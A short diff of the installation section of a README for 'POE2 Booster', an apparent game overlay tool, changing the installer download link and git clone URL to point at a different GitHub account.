@@ -37,14 +37,14 @@ All accessible from an **in-game overlay** — press `F4` to toggle the overlay 
 ## Installation
 
 ### Option 1: Installer (Recommended)
-1. Download `POE2_Booster_Setup.exe` from [Releases](https://github.com/poe2booster/poe2-booster/releases)
+1. Download `POE2_Booster_Setup.exe` from [Releases](https://github.com/jirapatchumee-netizen/poe2-booster/releases)
 2. Run installer
 3. Done! App starts automatically with Windows.
 
 ### Option 2: Python (Development)
 ```bash
 # Clone
-git clone https://github.com/poe2booster/poe2-booster.git
+git clone https://github.com/jirapatchumee-netizen/poe2-booster.git
 cd poe2-booster
 
 # Install dependencies
